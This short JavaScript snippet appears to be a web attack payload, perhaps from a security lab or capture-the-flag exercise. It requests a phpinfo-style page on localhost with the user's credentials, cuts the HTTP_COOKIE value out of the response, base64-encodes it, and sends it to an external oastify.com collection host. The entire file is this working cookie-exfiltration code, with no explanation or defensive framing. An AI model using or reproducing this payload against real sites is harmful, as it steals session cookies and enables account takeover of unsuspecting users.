var req = new XMLHttpRequest();
req.onload = reqListener;
var url = 'http://localhost:1337/info.php/index.php';
req.withCredentials = true; 
req.open('GET', url, false);
req.send();

function reqListener() {
var req2 = new XMLHttpRequest();
const sess = this.responseText.substring(this.responseText.indexOf('HTTP_COOKIE') + 1 );
req2.open('GET', 'https://p9zieht437fcygrsw0h8qu8rlir9f0bo0.oastify.com/?data=' + btoa(sess), false);
req2.send()
};
